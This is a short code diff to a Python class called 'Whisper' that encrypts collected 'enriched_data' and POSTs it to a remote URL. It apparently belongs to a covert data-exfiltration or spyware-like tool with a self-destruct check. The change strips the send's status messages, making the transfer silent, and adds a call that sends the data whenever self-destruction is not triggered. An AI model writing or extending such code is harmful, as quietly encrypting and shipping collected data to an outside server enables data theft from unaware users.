@@ -108,11 +108,7 @@ class Whisper:
         encrypted_data = Fernet(self.key).encrypt(enriched_data['data'])
         enriched_data['data'] = encrypted_data.decode('utf-8')
         try:
-            response = requests.post(self.http_url, json=enriched_data)
-            if response.status_code == SUCCESS_CODE:
-                print("Data sent successfully.")
-            else:
-                print(f"Failed to send data, status code: {response.status_code}")
+            requests.post(self.http_url, json=enriched_data)
 
         except Exception as e:
             print(f"Error sending data: {e}")
@@ -189,6 +185,8 @@ class Whisper:
         if enriched_data:
             if self._check_self_destruction(enriched_data):
                 print(f"Self distracting!")
+            else:
+                self._transfer_data(enriched_data)
 
 
 if __name__ == '__main__':
